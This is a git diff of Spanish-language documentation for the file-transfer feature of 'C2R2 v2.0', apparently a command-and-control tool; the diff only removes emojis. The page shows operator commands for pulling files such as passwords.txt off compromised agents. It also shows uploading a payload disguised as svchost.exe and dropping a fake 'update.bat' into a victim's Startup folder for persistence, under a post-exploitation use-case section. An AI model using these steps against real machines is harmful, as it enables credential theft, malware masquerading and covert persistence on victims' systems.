@@ -1,19 +1,19 @@
-# 📁 File Transfer - Download & Upload
+#  File Transfer - Download & Upload
 
 ## Descripción
 
 C2R2 v2.0 ahora incluye capacidades completas de transferencia de archivos entre el servidor C2 y los agentes comprometidos. Ambas operaciones (download y upload) utilizan codificación Base64 para transferir archivos binarios de forma segura sobre TCP.
 
-## 🔧 Características
+##  Características
 
-- ✅ **Download**: Descarga archivos desde el agente comprometido al servidor C2
-- ✅ **Upload**: Sube archivos desde el servidor C2 al agente comprometido
-- ✅ **Base64**: Codificación/decodificación nativa (sin dependencias externas)
-- ✅ **Binarios**: Soporta archivos binarios y de texto
-- ✅ **Auto-directorio**: Crea automáticamente el directorio `downloads/` en el servidor
-- ✅ **Feedback visual**: Indicadores coloridos del progreso de transferencia
+-  **Download**: Descarga archivos desde el agente comprometido al servidor C2
+-  **Upload**: Sube archivos desde el servidor C2 al agente comprometido
+-  **Base64**: Codificación/decodificación nativa (sin dependencias externas)
+-  **Binarios**: Soporta archivos binarios y de texto
+-  **Auto-directorio**: Crea automáticamente el directorio `downloads/` en el servidor
+-  **Feedback visual**: Indicadores coloridos del progreso de transferencia
 
-## 📥 Download - Descargar desde agente
+##  Download - Descargar desde agente
 
 ### Uso
 ```bash
@@ -35,15 +35,15 @@ C2R2 v2.0 ahora incluye capacidades completas de transferencia de archivos entre
 ### Salida
 ```
 ╔═══════════════════════════════════════════════════════════╗
-║              📥 ARCHIVO DESCARGADO [1]
+║               ARCHIVO DESCARGADO [1]
 ╚═══════════════════════════════════════════════════════════╝
 
-  📄 Archivo: passwords.txt
-  📊 Tamaño: 4523 bytes
-  💾 Guardado: downloads/passwords.txt
+   Archivo: passwords.txt
+   Tamaño: 4523 bytes
+   Guardado: downloads/passwords.txt
 ```
 
-## 📤 Upload - Subir al agente
+##  Upload - Subir al agente
 
 ### Uso
 ```bash
@@ -67,20 +67,20 @@ C2R2 v2.0 ahora incluye capacidades completas de transferencia de archivos entre
 ### Salida
 ```
 ╔═══════════════════════════════════════════════════════════╗
-║              📤 SUBIENDO ARCHIVO [1]
+║               SUBIENDO ARCHIVO [1]
 ╚═══════════════════════════════════════════════════════════╝
 
-  📄 Local: payload.exe
-  🎯 Remoto: C:\Users\Public\svchost.exe
-  📊 Tamaño: 73728 bytes
+   Local: payload.exe
+   Remoto: C:\Users\Public\svchost.exe
+   Tamaño: 73728 bytes
 
-✅ Éxito de [1]:
+ Éxito de [1]:
 ─────────────────────────────────────────────────────────
 Archivo guardado en C:\Users\Public\svchost.exe
 ─────────────────────────────────────────────────────────
 ```
 
-## 🔐 Implementación Técnica
+##  Implementación Técnica
 
 ### Protocolo de Comunicación
 
@@ -111,13 +111,13 @@ fn base64_decode(data: &str) -> Result<Vec<u8>, String>
 
 Esto mantiene el agente ligero (~60KB) y sin dependencias.
 
-## ⚠️ Manejo de Errores
+##  Manejo de Errores
 
 ### Errores Comunes
 
 **Archivo no encontrado (Download)**:
 ```
-❌ Error de [1]:
+ Error de [1]:
 ─────────────────────────────────────────────────────────
 No se pudo leer el archivo: The system cannot find the file specified. (os error 2)
 ─────────────────────────────────────────────────────────
@@ -125,7 +125,7 @@ No se pudo leer el archivo: The system cannot find the file specified. (os error
 
 **Permiso denegado (Upload)**:
 ```
-❌ Error de [1]:
+ Error de [1]:
 ─────────────────────────────────────────────────────────
 Error guardando archivo: Access is denied. (os error 5)
 ─────────────────────────────────────────────────────────
@@ -133,17 +133,17 @@ Error guardando archivo: Access is denied. (os error 5)
 
 **Archivo local inexistente (Upload)**:
 ```
-❌ Error leyendo archivo local: No such file or directory (os error 2)
+ Error leyendo archivo local: No such file or directory (os error 2)
 ```
 
-## 📊 Limitaciones
+##  Limitaciones
 
 - **Tamaño**: No hay límite técnico, pero archivos muy grandes pueden saturar la memoria
 - **Rendimiento**: Base64 aumenta el tamaño ~33%, recomendado para archivos < 50MB
 - **Paths**: Usar rutas absolutas en Windows, respetar espacios con comillas
 - **Permisos**: El agente necesita permisos de lectura/escritura en las rutas especificadas
 
-## 💡 Casos de Uso
+##  Casos de Uso
 
 ### Post-Explotación
 ```bash
@@ -167,7 +167,7 @@ Error guardando archivo: Access is denied. (os error 5)
 /upload startup.bat "C:\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.bat"
 ```
 
-## 🔍 Debug
+##  Debug
 
 Ambos componentes tienen mensajes DEBUG que se pueden ver:
 
@@ -181,10 +181,10 @@ DEBUG: Archivo guardado exitosamente
 
 **Servidor** (modo verbose `-v`):
 ```
-🔄 Decodificando 1368 bytes de base64...
+ Decodificando 1368 bytes de base64...
 ```
 
-## 🎯 Próximas Mejoras
+##  Próximas Mejoras
 
 - [ ] Compresión (gzip) antes de Base64 para archivos grandes
 - [ ] Chunking para archivos > 100MB
